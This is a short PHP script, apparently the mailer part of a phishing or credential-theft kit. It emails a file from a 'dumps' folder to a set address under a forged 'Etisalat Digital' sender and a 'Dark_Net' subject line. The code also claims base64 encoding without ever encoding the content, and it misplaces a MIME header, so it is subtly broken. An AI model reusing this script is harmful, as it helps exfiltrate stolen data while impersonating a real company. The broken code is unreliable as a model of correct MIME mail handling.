<?php
    $path = './dumps';
    $file = $path . "/" . $filename;

    $mailto = 'alerts@example.com';
    $subject = 'Dark_Net ' . $initiator . ' |'. $qq ." | ". $filename;
    $message = "_";

    $content = file_get_contents($file);
    $content = chunk_split($content);

    // a random hash will be necessary to send mixed content
    $separator = md5(time());

    // carriage return type (RFC)
    $eol = "\r\n";

    // main header (multipart mandatory)
    $headers = "From: Etisalat Digital <server@example.com>" . $eol;
    $headers .= "MIME-Version: 1.0" . $eol;
    $headers .= "Content-Type: multipart/mixed; boundary=\"" . $separator . "\"" . $eol;
    $headers .= "Content-Transfer-Encoding: 7bit" . $eol;
    $headers .= "This is a MIME encoded message." . $eol;
    
    // message
    $body = "--" . $separator . $eol;
    $body .= "Content-Type: text/plain; charset=\"iso-8859-1\"" . $eol;
    $body .= "Content-Transfer-Encoding: 8bit" . $eol;
    $body .= $message . $eol;

    // attachment
    $body .= "--" . $separator . $eol;
    $body .= "Content-Type: application/octet-stream; name=\"" . $filename . "\"" . $eol . $eol;
    $body .= "Content-Transfer-Encoding: base64" . $eol;
    $body .= "Content-Disposition: attachment" . $eol;
    sleep(1);
    $body .= $content . $eol;
    $body .= "--" . $separator . "--";
    
    //SEND Mail
    if (mail($mailto, $subject, $body, $headers)) {
        echo $filename;
    } else {
        echo "Send ... ERROR!";
        print_r( error_get_last() );
    }
?>